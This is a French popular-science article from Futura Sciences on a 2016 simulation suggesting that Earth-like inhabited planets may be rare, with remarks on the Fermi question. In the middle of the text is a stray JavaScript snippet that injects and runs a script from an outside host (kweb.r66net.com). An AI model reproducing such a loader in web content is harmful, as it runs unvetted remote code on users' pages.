{"title": "Exoplanete : et si la vie sur Terre etait un cas tres rare ?", "newspaper": "Futura Sciences", "author": ["Xavier Demeersman"], "date_publi": "2016-02-26", "content": "La recherche d'exoplanetes susceptibles d'abriter une vie telle que nous la connaissons bat son plein. En ce mois de novembre 2017, on parle beaucoup de Ross 128b, une planete tellurique qui tourne tres pres d'une petite etoile rouge. Elle est peut-etre habitable, comme bien d'autres mondes. Mais, en 2016, une equipe internationale de chercheurs a evalue le nombre de planetes ressemblant a la Terre. Selon ce modele, la plupart seraient apparues bien avant notre planete, ce qui pose la question de l'absence apparente de colonisation de la Galaxie par des civilisations intelligentes. Article paru le 22 fevrier 2016 <<  Sommes-nous seuls dans l'univers  ? >>  La question taraude  Homo sapiens  depuis longtemps. En attendant que des  voyages interstellaires  soient entrepris pour visiter des mondes lointains potentiellement habitables et que commence l'exploration des oceans internes d'Europe,  lune  de  Jupiter , et d' Encelade , petite lune de  Saturne , il nous faut nous contenter de speculations sur la base des (maigres) informations collectees ces dernieres decennies pour tenter d'y repondre. Depuis  Copernic  et avec l'eclosion des sciences, nous sommes progressivement passes d'un  << monde clos a l' univers  infini >>  ( dixit  Alexandre Koyre) ou l'Homme a du accepter qu'il n'en est pas le centre. En moins d'un siecle, nous avons realise que notre modeste  Soleil  appartient a un vaste ensemble qui compte quelque 200 milliards d' etoiles , qu'il n'y est meme pas au milieu et qu'en outre, la  Voie lactee  est une  galaxie  parmi des centaines de milliards d'autres a travers le cosmos. La question du centre n'a desormais plus de sens. Mais ce n'est pas fini, comme les philosophes atomistes de l'Antiquite en avait deja eu l'intuition et, plus de quinze siecles apres Lucrece,  Giordano Bruno  :  << Il est donc d'innombrables soleils et un nombre infini de terres tournant autour de ces soleils, a l'instar des sept \"terres\" que nous voyons tourner autour du Soleil qui nous est proche >>  ( in L'Infini, l'Univers et les Mondes , 1584). Sans surprises, en effet, quasiment toutes les etoiles qui brillent sont entourees de planetes. Si bien qu'il y a beaucoup plus de planetes que d'etoiles. De facon certaine,  2.000 exoplanetes  ont d'ores et deja ete identifiees depuis les premieres recherches, il y a un peu plus de 20 ans. Alors, d'autres terres auraient-elles accueilli la  vie  ? On est tente de repondre que si et meme qu'elle doit etre frequente. Decouverte en 2015,  Kepler-452b  (illustree a droite) est a ce jour l'exoplanete connue la plus ressemblante a la Terre (en comparaison, a gauche). Situee a environ 1.400 annees-lumiere de nous, elle a 1,7 milliard d'annees de plus que notre oasis bleue. (c) Nasa, JPL-Caltech, Ames                               Recenser les exoterres Pour Erik Zackrisson, de l'universite d'Uppsala (Suede), et son equipe, la reponse est loin d'etre evidente. D'apres leur  modelisation , il semblerait que l'avenement de  planetes rocheuses  habitables et habitees soit rare, voire tres rare.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Pour arriver a cette conclusion (l'etude est disponible sur  arXiv  et soumise pour publication dans  The Astrophysical Journal ), les chercheurs ont concocte une simulation de l'univers a partir d'une recette tenant compte de toutes les connaissances actuelles  physiques  et cosmologiques : formation des etoiles et des planetes, croissance des galaxies, extrapolations des donnees sur les  exoplanetes  connues, etc. Puis, apres une evolution en accelere de 13,8 milliards d'annees, ils ont evalue a travers ce mini-univers virtuel, le nombre de  planetes de type terrestre . Ils en ont recense des centaines de milliards de milliards (environ 7 x 10 20 ) autour d'etoiles plus ou moins chaudes, et plus ou moins grosses que notre Soleil, et aussi des  naines rouges . Une grande majorite d'entre elles sont apparues a leur grande surprise assez tot, souvent au sein de galaxies deux fois plus grandes que la notre et autour d'etoiles moins riches en elements lourds. Bon nombre d'entre elles seraient beaucoup plus agees que notre  petite planete  bleue (notre  Systeme solaire  n'a que 4,56 milliards d'annees). Aussi, dans la mesure ou les conditions favorables a l' emergence  de la vie sont reunies selon les cas, la question  << que sont devenus leurs habitants ? >>  s'impose. Ou sont-ils ?  << Pourquoi n'ont-ils pas colonise notre galaxie ? >> Qu'ont-ils fait durant tous ces milliards d'annees ? N'ont-ils pas eu le temps d'etendre leur domination ?  << Si vous avez des civilisations qui ont 3,5 milliards d'annees d'avance sur nous, pourquoi n'ont-elles pas colonise notre galaxie ?   demande  Max Tegmark , chercheur au MIT ( Massachusetts Institute of Technology ), interroge par la revue  Scientific American .  Pour moi, l'explication la plus probable est que, s'il y a des planetes a la pelle, les formes de vie intelligentes evoluent tres rarement >>.  Serions-nous alors seuls ou tres rares ? La  Terre  serait-elle une  << violation colossale du  principe de Copernic  >>,  comme l'estime le cosmologiste ? Ou est-elle une violation plus legere comme le propose Erik Zackrisson, le principal auteur de ces recherches ? Ce dernier tient a preciser qu'un grand flou et beaucoup d'incertitudes demeurent dans nos connaissances :  << S oit nous sommes le resultat d'une loterie tres improbable soit nous n'avons pas compris comment fonctionne la loterie >>.  En realite, on ne connait pas le vrai degre de precision du modele elabore avec nos connaissances actuelles. Finalement, la  Terre  est-elle une  oasis  solitaire ? Pour Max Tegmark,  << il se pourrait qu'un jour, dans un futur lointain, une grande partie de notre univers fourmille de vie a cause de ce que nous avons fait ici >>. Le mystere de la naissance des planetes                       Les planetes sont etonnamment variees et complexes. Au nombre de huit dans notre Systeme solaire, elles se sont formees apres le Big Bang selon un scenario surprenant. Decouvrez, grace a Discovery Science, la naissance de ces astres.                                       Vous avez aime cet article ? N'hesitez pas a le partager avec vos ami(e)s et aidez-nous a faire connaitre Futura :) ! La Redaction vous remercie. Facebook Twitter Google+ Linkedin Pinterest A voir aussi :  groupe sanguin tres rare  |  terre rare  |  serait- possible  |  vie serait quantique  |  def exoplanete  |  exoplanete  |  detection exoplanete  |  cancer rare  |  gaz rare definition  |  allergie rare", "theme": "sciences"}